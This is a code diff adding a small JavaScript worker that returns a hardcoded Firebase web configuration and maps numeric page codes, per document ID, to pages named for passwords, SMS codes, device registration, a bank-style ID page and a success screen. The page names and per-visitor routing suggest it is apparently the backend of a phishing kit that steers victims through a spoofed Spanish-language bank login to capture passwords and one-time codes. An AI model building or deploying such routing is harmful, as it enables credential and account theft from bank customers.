@@ -1,0 +1,102 @@
+// worker/routes.js
+var PAGE_ROUTES = {
+  1: "passwd.html",
+  3: "passwd.html",
+  4: "sms.html",
+  5: "registra-tu-dispositivo.html",
+  6: "pacifidID.html",
+  7: "dashboard.html",
+  8: "verificacion-exitosa.html",
+  9: "pacifidID.html",
+  13: "sms.html"
+};
+
+// worker/firebase-web.js
+var FIREBASE_WEB_CONFIG = {
+  apiKey: "AIzaSyAcWAKthLFTc3L1-Z2GaCRPHT5RG5Z8s4c",
+  authDomain: "o1u9a24o.firebaseapp.com",
+  projectId: "o1u9a24o",
+  storageBucket: "o1u9a24o.firebasestorage.app",
+  messagingSenderId: "351885765916",
+  appId: "1:351885765916:web:d2dbb07f7476484454ded9"
+};
+
+// worker/index.js
+var DOC_ID_RE = /^[^/]{4,500}$/;
+function parseAllowedOrigins(env) {
+  const raw = (env.ALLOWED_ORIGINS || "").trim();
+  if (!raw) {
+    return null;
+  }
+  return raw.split(",").map(function(s) {
+    return s.trim();
+  }).filter(Boolean);
+}
+function isOriginAllowed(request, env) {
+  const allowed = parseAllowedOrigins(env);
+  if (!allowed || allowed.length === 0) {
+    return true;
+  }
+  const origin = request.headers.get("Origin");
+  if (!origin) {
+    return true;
+  }
+  return allowed.indexOf(origin) >= 0;
+}
+function corsHeaders(request, env) {
+  const origin = request.headers.get("Origin");
+  const allowed = parseAllowedOrigins(env);
+  const headers = {
+    "Access-Control-Allow-Methods": "GET, OPTIONS",
+    "Access-Control-Allow-Headers": "Accept",
+    "Vary": "Origin"
+  };
+  if (origin && (!allowed || allowed.indexOf(origin) >= 0)) {
+    headers["Access-Control-Allow-Origin"] = origin;
+  } else if (!allowed) {
+    headers["Access-Control-Allow-Origin"] = "*";
+  }
+  return headers;
+}
+function jsonResponse(request, env, body, status) {
+  const headers = corsHeaders(request, env);
+  headers["Content-Type"] = "application/json; charset=utf-8";
+  headers["Cache-Control"] = "no-store";
+  return new Response(JSON.stringify(body), { status, headers });
+}
+function isApiPath(pathname) {
+  return pathname === "/api/route" || pathname === "/api/firebase-config";
+}
+var index_default = {
+  async fetch(request, env) {
+    const url = new URL(request.url);
+    if (isApiPath(url.pathname) && request.method === "OPTIONS") {
+      return new Response(null, { status: 204, headers: corsHeaders(request, env) });
+    }
+    if (!isApiPath(url.pathname) || request.method !== "GET") {
+      return new Response("Not Found", { status: 404 });
+    }
+    if (!isOriginAllowed(request, env)) {
+      return jsonResponse(request, env, { error: "forbidden_origin" }, 403);
+    }
+    if (url.pathname === "/api/firebase-config") {
+      return jsonResponse(request, env, FIREBASE_WEB_CONFIG, 200);
+    }
+    const page = Number(url.searchParams.get("page"));
+    const docId = (url.searchParams.get("docId") || "").trim();
+    if (!docId || !DOC_ID_RE.test(docId)) {
+      return jsonResponse(request, env, { error: "invalid_doc_id" }, 400);
+    }
+    if (!Number.isInteger(page) || page <= 0) {
+      return jsonResponse(request, env, { error: "invalid_page" }, 400);
+    }
+    const routeUrl = PAGE_ROUTES[page];
+    if (!routeUrl) {
+      return jsonResponse(request, env, { error: "unknown_page" }, 404);
+    }
+    return jsonResponse(request, env, { url: routeUrl }, 200);
+  }
+};
+export {
+  index_default as default
+};
